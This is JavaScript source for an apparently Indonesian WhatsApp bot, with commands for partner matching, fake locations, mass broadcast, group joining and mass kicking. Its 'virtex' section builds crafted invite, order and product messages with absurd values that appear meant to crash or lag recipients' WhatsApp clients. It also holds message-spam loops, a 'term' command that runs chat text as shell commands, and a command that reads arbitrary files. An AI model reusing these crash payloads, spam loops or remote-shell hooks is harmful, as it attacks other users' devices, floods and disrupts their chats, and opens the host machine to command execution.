				if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
                anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
                const anugaa = `${anug.split("@")[0]}@s.whatsapp.net`
				try {
				nextw = await client.getProfilePicture(`${anugaa.split('@')[0]}@s.whatsapp.net`)
} catch {
nextw = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
buffer = await getBuffer(nextw)

const bexasoa = await client.prepareMessage(from, buffer, MessageType.location, {thumbnail: buffer})

let yesad = bexasoa.message["ephemeralMessage"] ? bexasoa.message.ephemeralMessage : bexasoa
				await reply('Looking for a partner...')
				await sleep(3000)
const buttonsjodoh1 = [
  {buttonId: 'next', buttonText: {displayText: 'NEXT'}, type: 1},
]

const buttonMessagejodoh1 = {
    contentText: `Partner found: 🙉\n*${prefix}next* — find a new partner\nUsername:${pushname}\n@${anugaa.split("@")[0]}`,
    footerText: `wa.me/${anug}?text=Hai+boleh+kenalan+gak\n${support}`,
    buttons: buttonsjodoh1,
    headerType: 6, 
	locationMessage: yesad.message.locationMessage
}

client.sendMessage(from, buttonMessagejodoh1, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [anugaa, numbernye, dev, ow]}})
await confirmLIMIT(sender, [angka])
break
case 'fakeloc':
               var kntl = body.slice(8)
			   var nama = kntl.split("|")[0];
			   var impostor = kntl.split("|")[1];
               client.sendMessage(from, { name: `${nama}`,address: `${impostor}`}, MessageType.location)            
		    break 
case 'delete':
case 'del':
case 'd':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup && !isOwner) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
client.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
break   
case 'mode' :
if (!isRegistered) return sendButtonNotRegis(from)	
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
if (args[0] === 'self') {
if (banChats === true) return replysticker(faktifstc)
banChats = true
replysticker(successtc)					
} else if (args[0] === 'public') {
if (banChats === false) return replysticker(faktifstc)
banChats = false
replysticker(successtc)					
} else if (!q){
await sendButtonText(from, `_Pilih Mode Di Bawah Ini_`, support, [{buttonId: `public`,buttonText: {displayText: `PUBLIC`}, type: 1}, {buttonId: `self`, buttonText: {displayText: 'SELF'}, type: 1},], { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}
break
case 'wiskas':
if (!isRegistered) return sendButtonNotRegis(from)	
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
if (!q) return reply('Nama file nya apa ?')
anu = fs.readFileSync(`${q}`)
reply(String(anu))
break
case 'self':
if (!isRegistered) return sendButtonNotRegis(from)	
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
if (banChats === true) return replysticker(faktifstc)
banChats = true
replysticker(successtc)		
break
case 'public':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
if (banChats === false) return replysticker(faktifstc)
banChats = false
replysticker(successtc)		
break
case 'leave':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isOwner) return replysticker(ownerstc)
setTimeout( () => {
client.groupLeave (from) 
}, 2000)
setTimeout( () => {
client.updatePresence(from, Presence.composing)
replysticker(leavestc)
}, 0)
break
case 'bc': 
case 'broadcast': 
case 'broadcasting': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
anu = await client.chats.all()
if (isMedia && !mek.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
buff = await client.downloadMediaMessage(encmedia)
for (let _ of anu) {
client.sendMessage(_.jid, buff, image, {quoted: fgif, thumbnail: Buffer.alloc(0), caption: `[ *BROADCAST* ]\n${q}\n\n${support}`, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}})
}
setTimeout( () => {
replysticker(successtc)
}, 3000)	
} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
bc = await client.downloadMediaMessage(encmedia)
for (let _ of anu) {
client.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4',quoted: fgif,caption: `[ *BROADCAST* ]\n${q}\n\n${support}`, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}})
}
setTimeout( () => {
replysticker(successtc)
}, 3000)
} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
bc = await client.downloadMediaMessage(encmedia)
for (let _ of anu) {
client.sendMessage(_.jid, bc, sticker, {mimetype: Mimetype.gif,quoted : fgif,caption: `[ *BROADCAST* ]\n${q}\n\n${support}`, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}})
}
setTimeout( () => {
replysticker(successtc)
}, 3000)
} else if (isMedia && !mek.message.audioMessage || isQuotedAudio) {
const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
bc = await client.downloadMediaMessage(encmedia)
for (let _ of anu) {
client.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4', ptt : true,quoted: fgif,caption: `[ *BROADCAST* ]\n\n${q}`})
}
setTimeout( () => {
replysticker(successtc)
}, 3000)
} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
bc = await client.downloadMediaMessage(encmedia)
for (let _ of anu) {
client.sendMessage(_.jid, bc, sticker, {quoted: fgif})
}
setTimeout( () => {
replysticker(successtc)
}, 3000)
    } else if (q) {
for (let _ of anu) {
sendButtonImageLoc(_.jid, `*「 BROADCAST BOT 」*\n\n${q}`, support, buttonsmenu2, { quoted: fgif, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
}
setTimeout( () => {
replysticker(successtc)
}, 3000)
} else {
sendButtonImageLoc(from, `cara menggunakannya ketik ${prefix+command} pesan/vn/video/gambar yang ingin disiarkan`, support, buttonsmenu2, { quoted : fgif, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
}
break
case 'bcgc': 
case 'broadcastgc': 
case 'broadcastinggc': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
anu = await groupMembers
if (isMedia && !mek.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
buff = await client.downloadMediaMessage(encmedia)
for (let _ of anu) {
client.sendMessage(_.jid, buff, image, {quoted: fgif, thumbnail: Buffer.alloc(0), caption: `[ *BROADCAST* ]\n${q}\n\n${support}`, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}})
}
setTimeout( () => {
replysticker(successtc)
}, 3000)	
} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
bc = await client.downloadMediaMessage(encmedia)
for (let _ of anu) {
client.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4',quoted: fgif,caption: `[ *BROADCAST* ]\n${q}\n\n${support}`, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}})
}
setTimeout( () => {
replysticker(successtc)
}, 3000)
} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
bc = await client.downloadMediaMessage(encmedia)
for (let _ of anu) {
client.sendMessage(_.jid, bc, sticker, {mimetype: Mimetype.gif,quoted : fgif,caption: `[ *BROADCAST* ]\n${q}\n\n${support}`, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}})
}
setTimeout( () => {
replysticker(successtc)
}, 3000)
} else if (isMedia && !mek.message.audioMessage || isQuotedAudio) {
const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
bc = await client.downloadMediaMessage(encmedia)
for (let _ of anu) {
client.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4', ptt : true,quoted: fgif,caption: `[ *BROADCAST* ]\n\n${q}`})
}
setTimeout( () => {
replysticker(successtc)
}, 3000)
} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
bc = await client.downloadMediaMessage(encmedia)
for (let _ of anu) {
client.sendMessage(_.jid, bc, sticker, {quoted: fgif})
}
setTimeout( () => {
replysticker(successtc)
}, 3000)
    } else if (q) {
for (let _ of anu) {
sendButtonImageLoc(_.jid, `*「 BROADCAST 」*\n\n${q}`, support, buttonsmenu2, { quoted: fgif, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
}
setTimeout( () => {
replysticker(successtc)
}, 3000)
} else {
sendButtonImageLoc(from, `cara menggunakannya ketik ${prefix+command} pesan/vn/video/gambar yang ingin disiarkan`, support, buttonsmenu2, { quoted : fgif, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
}
break
case 'spam1':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
if (!q) return reply(`Penggunaan ${prefix+command} jumlah spam`)
if (isNaN(q[0])) return reply(`masukan input angka`)
var ambl = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
for (let i = 0; i < q[0]; i++){
reply(ambl)
}
setTimeout( () => {
replysticker(successtc)
}, 3000)
break
case 'setmenu':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from)
if (!isOwner) return replysticker(ownerstc)
if ((args[0]) == 'ori'){
if (mainmenu === false) return replysticker(faktifstc)
mainmenu = false
replysticker(successtc)
} else if((args[0]) == 'simple'){
if (mainmenu === true) return replysticker(faktifstc)
mainmenu = true
replysticker(successtc)
} else {
await sendButtonText(from, `_Pilih Tipe Di Bawah Ini_`, support, [{buttonId: `setmenu simple`,buttonText: {displayText: `Simple`}, type: 1}, {buttonId: `setmenu ori`, buttonText: {displayText: 'Ori'}, type: 1},], { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}
break
case 'spam':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 1) {
ambl = mek.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage.caption
if (isNaN(q[0])) return reply(`harus berupa angka`)
for (let i = 0; i < q[0]; i++){
reply(ambl) 
}
setTimeout( () => {
replysticker(successtc)
}, 3000)
} else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 1) {
ambl = mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.caption 
if (isNaN(q[0])) return reply(`harus berupa angka`)
for (let i = 0; i < q[0]; i++){
reply(ambl) 
}
setTimeout( () => {
replysticker(successtc)
}, 3000)
} else if ((!mek.message.quotedMessage) && args.length == 1) {
ambl = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation 
if (isNaN(q[0])) return reply(`harus berupa angka`)
for (let i = 0; i < q[0]; i++){
reply(ambl) 
}
setTimeout( () => {
replysticker(successtc)
}, 3000)
}
break
case 'spam':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
if (!q) return reply(`Penggunaan ${prefix+command} teks|jumlah spam`)
argzi = q.split(".")
if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
if (isNaN(argzi[1])) return reply(`harus berupa angka`)
for (let i = 0; i < argzi[1]; i++){
client.sendMessage(from, argzi[0], MessageType.text)
}
setTimeout( () => {
replysticker(successtc)
}, 3000)
break
case 'join':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)            
		            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(lang.erorLink())
		            hen = args[0]
		            if (!q) return reply('Masukan link group')
		            var response = await client.acceptInvite(q)
		            reply('```SUKSES JOIN GRUP```')
		            break
case 'on':
case 'enable':
			if (isBanned) return reply(ind.baned())
			if (!isRegistered) return sendButtonNotRegis(from)
			if (!isOwner) return replysticker(ownerstc)
			if (args[0] === 'anticall') {
			if (antical === true) return replysticker(faktifstc)
			antical = true
			replysticker(successtc)
			} else if (args[0] === 'autoreadgc') {
			if (readG === true) return replysticker(faktifstc)
			readG = true
			replysticker(successtc)
			} else if (args[0] === 'autoreadpc') {
			if (readP === true) return replysticker(faktifstc)
			readP = true
			replysticker(successtc)
			} else if (args[0] === 'antitag') {
			if (antitags === true) return replysticker(faktifstc)
			antitags = true
			replysticker(successtc)
			} else if (args[0] === 'autobackup') {
			if (autobackup === true) return replysticker(faktifstc)
			autobackup = true
			replysticker(successtc)
			} else if (args[0] === 'autorespon') {
			if (autorespon === true) return replysticker(faktifstc)
			autorespon = true
			replysticker(successtc)
			} else if (args[0] === 'autoregis') {
			if (autoregis === true) return replysticker(faktifstc)
			autoregis = true
			replysticker(successtc)
			} else if (args[0] === 'autocomposing') {
			if (autocomposing === true) return replysticker(faktifstc)
			autocomposing = true
			replysticker(successtc)
			} else if (args[0] === 'autorecording') {
			if (autorecording === true) return replysticker(faktifstc)
			autorecording = true
			replysticker(successtc)
			} else if (args[0] === 'antibug') {
			if (bugc === true) return replysticker(faktifstc)
            bugc = true
            antitrol = true
            replysticker(successtc)
			} else {
			if(mainmenu == false){
{
const buttonMessage = [
{title: 'Anti Call', description: `use command:${prefix+command} anticall`, rowId:`on anticall`},
{title: 'Anti Registrasi', description: `use command:${prefix+command} autoregis`, rowId:`on autoregis`},
{title: 'auto Read Pc', description: `use command:${prefix+command} autoreadpc`, rowId:`on autoreadpc`},
{title: 'auto Read Gc', description: `use command:${prefix+command} autoreadgc`, rowId:`on autoreadgc`},
{title: 'Anti Tag', description: `use command:${prefix+command} antitag`, rowId:`on antitag`},
{title: 'Anti Bug', description: `use command:${prefix+command} antibug`, rowId:`on antibug`},
{title: 'Auto Respon', description: `use command:${prefix+command} autorespon`, rowId:`on autorespon`},
{title: 'Auto Backup', description: `use command:${prefix+command} autobackup`, rowId:`on autobackup`},
{title: 'Auto Composing', description: `use command:${prefix+command} autocomposing`, rowId:`on autocomposing`},
{title: 'Auto Recording', description: `use command:${prefix+command} autorecording`, rowId:`on autorecording`},
 ]
const sections = [
{title: "Enable", rows: buttonMessage},
]

const buttons = {
 buttonText: 'ENABLE',
 footerText: support,
 description: buttonshello, 
 sections: sections,
 listType: 1
}
sendListMes(buttons)
}
} else if(mainmenu = true){ 
sendButtonImageLoc(from, buttonshello, ind.setingbot(prefix, command, dev, numbernye)+support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
} 
			} 
		break
case 'off':
case 'disable':
			if (isBanned) return reply(ind.baned())
			if (!isRegistered) return sendButtonNotRegis(from)
			if (!isOwner) return reply(ind.ownerb())
			if (args[0] === 'anticall') {
			if (antical === false) return replysticker(faktifstc)
		    antical = false
		    replysticker(successtc)
			} else if (args[0] === 'autoreadgc') {
			if (readG === false) return replysticker(faktifstc)
			readG = false
			replysticker(successtc)
			} else if (args[0] === 'autoreadpc') {
			if (readP === false) return replysticker(faktifstc)
			readP = false
			replysticker(successtc)
			} else if (args[0] === 'antitag') {
			if (antitags === false) return replysticker(faktifstc)
			antitags = false
			replysticker(successtc)
			} else if (args[0] === 'autorespon') {
			if (autorespon === false) return replysticker(faktifstc)
			autorespon = false
			replysticker(successtc)
			} else if (args[0] === 'autobackup') {
			if (autobackup === false) return replysticker(faktifstc)
			autobackup = false
			replysticker(successtc)
			} else if (args[0] === 'autoregis') {
			if (autoregis === false) return replysticker(faktifstc)
			autoregis = false
			replysticker(successtc)
			} else if (args[0] === 'autocomposing') {
			if (autocomposing === false) return replysticker(faktifstc)
			autocomposing = false
			replysticker(successtc)
			} else if (args[0] === 'autorecording') {
			if (autorecording === false) return replysticker(faktifstc)
			autorecording = false
			replysticker(successtc)
			} else if (args[0] === 'antibug') {
			if (bugc === false) return replysticker(faktifstc)
            bugc = false
            antitrol = false
            replysticker(successtc)
			} else {
			if(mainmenu == false){
{
 const buttonMessage = [
{title: 'Anti Call', description: `use command:${prefix+command} anticall`, rowId:`off anticall`},
{title: 'Anti Registrasi', description: `use command:${prefix+command} autoregis`, rowId:`off autoregis`},
{title: 'auto Read Pc', description: `use command:${prefix+command} autoreadpc`, rowId:`off autoreadpc`},
{title: 'auto Read Gc', description: `use command:${prefix+command} autoreadgc`, rowId:`off autoreadgc`},
{title: 'Anti Tag', description: `use command:${prefix+command} antitag`, rowId:`off antitag`},
{title: 'Anti Bug', description: `use command:${prefix+command} antibug`, rowId:`off antibug`},
{title: 'Auto Respon', description: `use command:${prefix+command} autorespon`, rowId:`off autorespon`},
{title: 'Auto Backup', description: `use command:${prefix+command} autobackup`, rowId:`off autobackup`},
{title: 'Auto Composing', description: `use command:${prefix+command} autocomposing`, rowId:`off autocomposing`},
{title: 'Auto Recording', description: `use command:${prefix+command} autorecording`, rowId:`off autorecording`},
 ]
const sections = [
{title: "Disable", rows: buttonMessage},
]

const buttons = {
 buttonText: 'DISABALE',
 footerText: support,
 description: buttonshello, 
 sections: sections,
 listType: 1
}
sendListMes(buttons)
}
} else if(mainmenu = true){ 
sendButtonImageLoc(from, buttonshello, ind.setingbot(prefix, command, dev, numbernye), buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
} 
} 
break
case 'settheme':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner)return replysticker(ownerstc)	
if (args[0] === "cecan") {
if (themenye = cecan) return replysticker(faktifstc)
themenye = cecan
replysticker(successtc)
} else if (args[0] === "cogan") {
if (themenye = cogan) return replysticker(faktifstc)
themenye = cogan
replysticker(successtc)
} else if (args[0] === "meme") {
if (themenye = meme) return replysticker(faktifstc)
themenye = meme
replysticker(successtc)
} else if (args[0] === "genshin") {
if (themenye = genshin) return replysticker(faktifstc)
themenye = genshin
replysticker(successtc)
} else if (args[0] === "fantasy") {
if (themenye = dungeon) return replysticker(faktifstc)
themenye = dungeon
replysticker(successtc)
} else if (args[0] === "ml") {
if (themenye = ml) return replysticker(faktifstc)
themenye = ml
replysticker(successtc)
} else if (args[0] === "default") {
if (themenye = deflttheme) return replysticker(faktifstc)
themenye = deflttheme
replysticker(successtc)
} else {
if(mainmenu == false){
{
 const buttonMessage = [
{title: 'Default', description: "", rowId:`settheme default`},
{title: 'Cecan', description: "", rowId:`settheme cecan`},
{title: 'Cogan', description: "", rowId:`settheme genshin`},
{title: 'Genshin Impact', description: "", rowId:`settheme genshin`},
{title: 'Fantasy', description: "", rowId:`settheme fantasy`},
 ]
const sections = [
{title: "SET TEMA", rows: buttonMessage},
]

const buttons = {
 buttonText: 'TEMA',
 footerText: support,
 description: buttonshello, 
 sections: sections,
 listType: 1
}
sendListMes(buttons)
}
} else if(mainmenu = true){ 
sendButtonImageLoc(from, buttonshello, ind.tema(prefix, command, dev, numbernye), buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
} 
} 
break
case 'setlink':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner)return replysticker(ownerstc)	
if (args[0] === "com") {
if (themenye = `${linkcom}`) return replysticker(faktifstc)
linknye = `${linkcom}`
replysticker(successtc)
} else if (args[0] === "id") {
if (themenye = `${linkid}`) return replysticker(faktifstc)
linknye = `${linkid}`
replysticker(successtc)
} else if (args[0] === "xyz") {
if (themenye = `${linkxyz}`) return replysticker(faktifstc)
linknye = `${linkxyz}`
replysticker(successtc)
} else if (args[0] === "http") {
if (themenye = `${linkhttp}`) return replysticker(faktifstc)
linknye = `${linkhttp}`
replysticker(successtc)
} else if (args[0] === "ly") {
if (themenye = `${linkly}`) return replysticker(faktifstc)
linknye = `${linkly}`
replysticker(successtc)
} else if (args[0] === "wa") {
if (themenye = `${linkwa}`) return replysticker(faktifstc)
linknye = `${linkwa}`
replysticker(successtc)
} else if (args[0] === "default") {
if (themenye = `${deflt}`) return replysticker(faktifstc)
linknye = `${deflt}`
replysticker(successtc)
} else {
if(mainmenu == false){
{
 const buttonMessage = [
{title: 'Default', description: "", rowId:`setliink default`},
{title: 'Com', description: "", rowId:`setliink com`},
{title: 'Id', description: "", rowId:`setliink id`},
{title: 'Xyz', description: "", rowId:`setliink xyz`},
{title: 'Http', description: "", rowId:`setliink http`},
{title: 'ly', description: "", rowId:`setliink ly`},
 ]
const sections = [
{title: "SET LINK", rows: buttonMessage},
]

const buttons = {
 buttonText: 'LINK',
 footerText: support,
 description: buttonshello, 
 sections: sections,
 listType: 1
}
sendListMes(buttons)
}
} else if(mainmenu = true){ 
sendButtonImageLoc(from, buttonshello, ind.linkban(prefix, command, dev, numbernye), buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
} 
}
break
case 'setppbot':
case 'ppbot':
case 'setppb':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
client.updatePresence(from, Presence.composing) 
if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix+command} atau tag gambar yang sudah dikirim`)
enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await client.downloadAndSaveMediaMessage(enmedia)
await client.updateProfilePicture(botNumber, media)
replysticker(successtc)
break 	
case 'setnamebot':
case 'namebot':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner)return replysticker(ownerstc)	
if (!q) return reply(`Kirim gambar dengan caption ${prefix+command} ${fake}`)
fake = q
replysticker(successtc)
break
case 'setprefix':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from)
if (!isOwner) return replysticker(ownerstc)
if (args.length < 1) return reply(`Kirim gambar dengan caption ${prefix+command} ${fake} ${prefix}setprefix multi atau ${prefix+command} prefix yang di inginkan`)
if (args[0] === 'multi') {
if (multi === true) return
multi = true
replysticker(successtc)
} else {
multi = false
pref = args[0]
replysticker(successtc)
}
break	
case 'q': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
if (!qse.quoted) return reply(`Reply pesan yang mengandung reply dengan caption ${prefix+command}`)
let qse = client.serializeM(await m.getQuotedObj())
await qse.quoted.copyNForward(m.chat, true)
break
case 'term':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner)return replysticker(ownerstc)	
if (!q) return reply(`Kirim gambar dengan caption ${prefix+command} command yang ingin di jalankan`)
exec(q, (err, stdout) => {
if (err) return reply(`${fake}:~ ${err}`)
if (stdout) {
reply(stdout)
}
})
break 
//********** UP STATUS **********
case 'upsw': 
case 'upstatus': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
anu = await groupMembers
if (isMedia && !mek.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
buff = await client.downloadMediaMessage(encmedia)
client.sendMessage('status@broadcast', buff, image, { caption: `${q}` })
replysticker(successtc)
setTimeout( () => {
replysticker(successtc)
}, 3000)	
} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
bc = await client.downloadMediaMessage(encmedia)
client.sendMessage('status@broadcast', bc, video, { caption: `${q}` }) 
setTimeout( () => {
replysticker(successtc)
}, 3000)
} else if (isMedia && !mek.message.audioMessage || isQuotedAudio) {
const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
bc = await client.downloadMediaMessage(encmedia)
client.sendMessage('status@broadcast', bc, video, { caption: `${q}` }) 
setTimeout( () => {
replysticker(successtc)
}, 3000)
} else if (q) {
client.sendMessage('status@broadcast', `${q}`, extendedText)
setTimeout( () => {
replysticker(successtc)
}, 3000)
} else {
sendButtonImageLoc(from, `cara menggunakannya ketik ${prefix+command} pesan/vn/video/gambar yang ingin disiarkan`, support, buttonsmenu2, { quoted : fgif, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
}
break
case 'listgroup':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from)	
if (!isOwner) return replysticker(ownerstc)
ingfoo = await getGroup(totalchat)
teks1 = `*L I S T  G R O U P*\nJumlah Grup: ${ingfoo.length}\n\n`
for (let i = 0; i < ingfoo.length; i++){
teks1 += `• Nama grup : ${ingfoo[i].subject}\n• ID grup : ${ingfoo[i].id}\n• Dibuat : ${moment(`${ingfoo[i].creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n• Jumlah Peserta : ${ingfoo[i].participants.length}\n\n`
}
sendButtonImageLoc(from, buttonshello, teks1, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break
//********** KUDETA SISTEM **********
case 'virtex' :
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from)	
if (!isOwner) return replysticker(ownerstc)
if (args[0] === 'teks') {
buf = WMthumb
imeu = await client.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await client.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": "162533333338378",
"groupName": `LUC BOT ~ 404 ${vipi}`,
"jpegThumbnail": WMthumb,
"caption": "https://chat.whatsapp.com/GY74IwuwLlFELw97ByRk79",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:imeu, contextInfo:{}})
client.relayWAMessage(res)
await setTimeout(() => {
reply(`PUNTEN PAKET.....${vipi}`)
}, 3000)			
} else if (args[0] === 'troli') {
buf = WMthumb
imeu = await client.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await client.prepareMessageFromContent(from,{
"orderMessage": {
"orderId": "150453297177375",
"thumbnail": WMthumb,
"itemCount": 1000000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "LUC BOT ~ ERROR",
"message":"KAK PESEN SEBLAK ",
"sellerJid": "6289530298948@s.whatsapp.net",
"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
"totalAmount1000": "99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 99999,
"isForwarded": true
}
}
}, {quoted:fakeitem, contextInfo:{}}) 
client.toggleDisappearingMessages(from, 'Awoakwoakwoak')
client.relayWAMessage(res)
} else if (args[0] === 'catalog') {	
buf = WMthumb
imeu = await client.prepareMessage('0@s.whatsapp.net', buf, image, {thumbnail: WMthumb}) 
imeg = imeu.message.imageMessage
res = await client.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"productId": "150453297177375",
"title": `${hahh}`, 
"description": `${virtex}`,
"currencyCode": "IDR",
"priceAmount1000": "50000",
"productImageCount": 1
},
"businessOwnerJid": "6289530298948@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [player, numbernye, ow, dev]}}) 

client.relayWAMessage(res)
} else {
if(mainmenu == false){
{
 const buttonMessage = [
{title: 'Virtex Teks', description: "Virtex Teks", rowId:`virtex teks`},
{title: 'Virtex Troli', description: "Virtex Troli", rowId:`virtex troli`},
{title: 'Virtex Catalog', description: "Virtex Catalog", rowId:`virtex catalog`},
 ]
const sections = [
{title: "VIRTEX", rows: buttonMessage},
]

const buttons = {
 buttonText: 'VIRTEX',
 footerText: support,
 description: buttonshello, 
 sections: sections,
 listType: 1
}
sendListMes(buttons)
}
} else if(mainmenu = true){ 
sendButtonImageLoc(from, buttonshello, ind.virtex(prefix, command, dev, numbernye)+support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} )
} 
}
break
case 'kickall':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isOwner) return replysticker(ownerstc)
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `*😘* ${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
client.groupRemove(from, members_id)
break
